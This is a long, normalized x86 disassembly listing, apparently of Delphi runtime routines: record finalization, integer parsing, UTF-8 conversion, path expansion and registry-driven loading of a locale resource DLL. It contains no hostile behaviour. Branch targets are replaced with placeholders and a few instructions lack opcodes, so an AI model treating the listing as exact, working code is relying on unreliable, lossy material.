mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049a4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404974
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404a38
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a84
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a84
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40402c
jmp r-xdata
call sub_404008
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404700
jmp r-xdata
call sub_4046e8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a6c
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a84
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a38
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405874
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4051c8
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404b94
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_40405c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404724
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b7c
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404cb0
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b94
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40588c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405204
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404cb0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40405c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404724
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b7c
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404cb0
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b94
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40588c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405204
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404dac
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404dd0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a54
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a54
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404dac
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405030
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405028
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402ca4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a84
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402ca4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405010
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405030
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4051c8
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a84
sub_405204
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4051c8
pop edx
pop eax
sub_40522c
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_40525c
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_405498
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4052a4
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_40525c
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4052e0
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4052cc
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4052cc
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4052cc
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405498
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40559d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4052e0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405738
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_405798
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4057d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405804
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405868
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40586f
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_40588c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4058b8
test edx edx
je sub_405874
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_40595c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405a60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405b98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
mov eax ebx
xor edx edx
call sub_404860
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c3e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_404854
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404654
mov eax ebx
call sub_404854
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
inc eax
push eax
mov eax ebx
call sub_404844
